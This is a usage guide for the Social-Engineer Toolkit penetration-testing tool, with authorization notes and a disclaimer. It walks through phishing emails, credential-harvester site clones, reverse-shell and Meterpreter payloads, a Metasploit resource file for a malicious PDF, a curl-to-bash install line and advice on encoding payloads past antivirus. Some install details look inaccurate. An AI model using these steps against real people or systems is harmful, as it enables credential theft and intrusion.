# Social Engineering Toolkit (SET) - Usage Guide

## Table of Contents
1. [Installation](#installation)
2. [Quick Start](#quick-start)
3. [Attack Vectors](#attack-vectors)
4. [Advanced Usage](#advanced-usage)
5. [Troubleshooting](#troubleshooting)
6. [Best Practices](#best-practices)

## Installation

### Prerequisites
- Python 2.7+ or 3.x
- Metasploit Framework
- Root/Administrator privileges

### Installation Methods

#### Method 1: pip Installation
```bash
pip install set
```

#### Method 2: Git Clone
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
python setup.py install
```

#### Method 3: Package Manager (Debian/Ubuntu)
```bash
apt update
apt install set
```

### Post-Installation Setup
```bash
# Run SET for first-time configuration
setoolkit

# Or use the legacy launcher
python src/core/set.py
```

## Quick Start

### 1. Launch SET
```bash
# Main launcher
setoolkit

# Alternative launcher
python src/core/set.py
```

### 2. Basic Menu Navigation
```
Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

   99) Exit the Social-Engineer Toolkit
```

### 3. First Attack - Spear Phishing
```
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
       1) Send email to target
           1) Email Attack Single Email Address
```

## Attack Vectors

### 1. Spear Phishing Attacks

#### Email Attack with Attachment
```bash
# Navigate to: Social-Engineering Attacks > Spear-Phishing Attack Vectors
# Select: Send email to target > Email Attack Single Email Address

# Configuration:
# - Email address: victim@company.com
# - Email subject: "Important Security Update"
# - Email body: "Please review the attached document"
# - Attachment: Generated payload (PDF, DOC, etc.)
```

#### Mass Mailer Attack
```bash
# Navigate to: Social-Engineering Attacks > Spear-Phishing Attack Vectors
# Select: Send email to target > Mass Email Attack

# Configuration:
# - Email list: /path/to/email_list.txt
# - Email template: Pre-defined or custom
# - Attachment: Payload file
```

### 2. Web Attack Vectors

#### Credential Harvester
```bash
# Navigate to: Social-Engineering Attacks > Web Attack Vectors
# Select: Credential Harvester Attack Method

# Configuration:
# - Attack method: Web Templates
# - Template: Gmail, Facebook, Twitter, etc.
# - Clone URL: https://gmail.com
# - IP address: Your attacking machine IP
# - Port: 80 (or custom)
```

#### Website Cloner
```bash
# Navigate to: Social-Engineering Attacks > Web Attack Vectors
# Select: Web-Jacking Attack Method

# Configuration:
# - URL to clone: https://target-website.com
# - Attack method: Java Applet, Browser Exploit, etc.
# - IP address: Your attacking machine IP
```

#### Tabnabbing Attack
```bash
# Navigate to: Social-Engineering Attacks > Web Attack Vectors
# Select: Tabnabbing Attack Method

# Configuration:
# - URL to clone: https://target-website.com
# - Attack method: Tabnabbing
# - IP address: Your attacking machine IP
```

### 3. Infectious Media Generator

#### USB/CD/DVD Attack
```bash
# Navigate to: Social-Engineering Attacks > Infectious Media Generator
# Select: File-Format Exploits

# Configuration:
# - Attack method: PDF, DOC, RTF, MOV, etc.
# - Payload: Windows Meterpreter Reverse TCP
# - IP address: Your attacking machine IP
# - Port: 4444
```

### 4. Teensy USB HID Attack

#### Physical Device Attack
```bash
# Navigate to: Social-Engineering Attacks > Teensy USB HID Attack Vector
# Select: Create a payload and listener

# Configuration:
# - Attack method: PowerShell Download and Execute
# - IP address: Your attacking machine IP
# - Port: 80
# - Output: teensy_payload.ino
```

### 5. Wireless Attack Vectors

#### Access Point Attack
```bash
# Navigate to: Social-Engineering Attacks > Wireless Attack Vectors
# Select: Access Point Attack Vector

# Configuration:
# - Attack method: Hostapd
# - Interface: wlan0
# - SSID: Free_WiFi
# - Channel: 6
```

#### DNS Spoofing
```bash
# Navigate to: Social-Engineering Attacks > Wireless Attack Vectors
# Select: DNS Spoofing Attack Vector

# Configuration:
# - Interface: wlan0
# - Target domain: *.google.com
# - Redirect to: Your malicious server
```

### 6. PowerShell Attack Vectors

#### PowerShell Shellcode Injection
```bash
# Navigate to: Social-Engineering Attacks > PowerShell Attack Vectors
# Select: PowerShell Alphanumeric Shellcode Injector

# Configuration:
# - IP address: Your attacking machine IP
# - Port: 4444
# - Payload: Windows Meterpreter Reverse TCP
```

#### PowerShell Reverse Shell
```bash
# Navigate to: Social-Engineering Attacks > PowerShell Attack Vectors
# Select: PowerShell Reverse Shell

# Configuration:
# - IP address: Your attacking machine IP
# - Port: 4444
# - Listener: Metasploit or custom
```

## Advanced Usage

### 1. Custom Payloads

#### Creating Custom Executables
```python
# In setcore.py, modify the custom_executable function
def custom_executable():
    """
    Create custom executable payload
    """
    # Your custom payload creation logic
    pass
```

#### Using Custom Templates
```bash
# Place custom templates in src/templates/
# Use naming convention: custom_template.template
# Reference in attack configuration
```

### 2. Metasploit Integration

#### Custom Resource Files
```python
# SET generates .rc files for Metasploit
# Location: /root/.set/reports/
# Example: msf_attack_2019-01-01.rc

# Customize the resource file:
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set FILENAME malicious.pdf
exploit
```

#### Advanced Payload Options
```bash
# Navigate to: Social-Engineering Attacks > Spear-Phishing Attack Vectors
# Select: Create a FileFormat Payload

# Advanced options:
# - Encoder: shikata_ga_nai, x86/alpha_mixed, etc.
# - Iterations: 1-10
# - Bad characters: \x00\x0a\x0d
# - Architecture: x86, x64
```

### 3. Web Server Configuration

#### Apache Integration
```bash
# Enable Apache integration in set.config
APACHE_SERVER=ON
APACHE_DIRECTORY=/var/www/html

# Start Apache service
systemctl start apache2

# SET will use Apache instead of built-in server
```

#### SSL/HTTPS Setup
```bash
# Enable SSL in set.config
WEBATTACK_SSL=ON

# Place SSL certificates in:
# - Certificate: /etc/setoolkit/ssl.crt
# - Private key: /etc/setoolkit/ssl.key
```

### 4. Email Configuration

#### SMTP Provider Setup
```bash
# Gmail configuration
EMAIL_PROVIDER=gmail
GMAIL_SMTP=smtp.gmail.com
GMAIL_PORT=587
GMAIL_USER=your-email@gmail.com
GMAIL_PASS=your-app-password

# Custom SMTP server
EMAIL_PROVIDER=custom
CUSTOM_SMTP=mail.company.com
CUSTOM_PORT=25
```

#### Email Templates
```bash
# Create custom email templates in:
# src/phishing/smtp/templates/

# Template format:
# Subject: Your subject here
# Body: Your email body here
# Variables: {TARGET_NAME}, {COMPANY_NAME}, etc.
```

### 5. Logging and Monitoring

#### Enable Detailed Logging
```python
# In setcore.py, set debug level
DEBUG_LEVEL = 5  # 0-6, higher = more verbose

# Log files location:
# - Main log: /root/.set/logs/set_logfile.log
# - Harvester log: /root/.set/logs/harvester.log
# - Reports: /root/.set/reports/
```

#### Monitor Attack Progress
```bash
# Real-time log monitoring
tail -f /root/.set/logs/set_logfile.log

# Check harvester captures
cat /root/.set/logs/harvester.log

# View generated reports
ls -la /root/.set/reports/
```

## Troubleshooting

### Common Issues

#### 1. Metasploit Not Found
```bash
# Error: Metasploit not found
# Solution: Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | bash

# Or set custom path in set.config
METASPLOIT_PATH=/opt/metasploit-framework/
```

#### 2. Port Already in Use
```bash
# Error: Port 80 already in use
# Solution: Stop conflicting services
systemctl stop apache2
systemctl stop nginx

# Or use different port
WEB_PORT=8080
```

#### 3. Permission Denied
```bash
# Error: Permission denied
# Solution: Run with appropriate privileges
sudo setoolkit

# Or fix file permissions
chmod +x setoolkit
chmod -R 755 /usr/local/share/setoolkit/
```

#### 4. Python Module Missing
```bash
# Error: Module not found
# Solution: Install missing dependencies
pip install -r requirements.txt

# Or install specific module
pip install pycrypto
pip install requests
pip install pyopenssl
```

#### 5. SSL Certificate Issues
```bash
# Error: SSL certificate problems
# Solution: Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout ssl.key -out ssl.crt -days 365 -nodes

# Copy to SET directory
cp ssl.key /etc/setoolkit/
cp ssl.crt /etc/setoolkit/
```

### Debug Mode

#### Enable Debug Mode
```python
# In setcore.py, modify debug level
DEBUG_LEVEL = 6  # Maximum verbosity

# Debug levels:
# 0: Off
# 1: Imports only
# 2: Imports with pause
# 3: Imports + info messages
# 4: Imports + info + pause
# 5: Imports + info + menus
# 6: Imports + info + menus + pause
```

#### Debug Output
```bash
# Debug information appears in:
# - Console output
# - Log files
# - Error messages

# Common debug messages:
# [DEBUG] Loading module: harvester
# [DEBUG] Metasploit path: /usr/share/metasploit-framework/
# [DEBUG] IP address detected: 192.168.1.100
```

## Best Practices

### 1. Security Considerations

#### Authorization
- Always obtain written permission before testing
- Use only on systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

#### Isolation
- Use isolated test environments
- Implement network segmentation
- Monitor all activities
- Maintain detailed logs

### 2. Operational Best Practices

#### Preparation
- Plan attacks thoroughly
- Test payloads in controlled environments
- Prepare incident response procedures
- Document all activities

#### Execution
- Start with low-impact attacks
- Monitor system responses
- Maintain communication with stakeholders
- Document findings immediately

#### Cleanup
- Remove all artifacts
- Restore original configurations
- Provide detailed reports
- Follow up on recommendations

### 3. Technical Best Practices

#### Payload Development
- Use multiple encoding techniques
- Test against various antivirus solutions
- Implement proper error handling
- Use randomized filenames and paths

#### Network Configuration
- Use proper IP addressing
- Implement port forwarding as needed
- Configure firewall rules appropriately
- Monitor network traffic

#### Logging and Monitoring
- Enable comprehensive logging
- Monitor all activities
- Maintain audit trails
- Regular log analysis

### 4. Reporting

#### Attack Reports
- Document all attack vectors used
- Include screenshots and evidence
- Provide remediation recommendations
- Include timeline of activities

#### Technical Details
- List all tools and techniques used
- Document configuration changes
- Include payload details
- Provide code samples

#### Recommendations
- Prioritize findings by risk level
- Provide specific remediation steps
- Include prevention measures
- Suggest security improvements

## Additional Resources

### Documentation
- **User Manual**: `readme/User_Manual.pdf`
- **API Documentation**: `API_DOCUMENTATION.md`
- **Changelog**: `readme/CHANGELOG`
- **Credits**: `readme/CREDITS`

### Community
- **GitHub Repository**: https://github.com/trustedsec/social-engineer-toolkit
- **Issue Tracker**: https://github.com/trustedsec/social-engineer-toolkit/issues
- **Discussions**: GitHub Discussions tab

### Training
- **SET Training**: Official SET training courses
- **Social Engineering**: Social engineering awareness training
- **Penetration Testing**: General penetration testing courses

---

**Disclaimer**: This toolkit is for authorized security testing only. Users are responsible for ensuring they have proper authorization before conducting any tests. The authors and contributors are not responsible for any misuse of this software.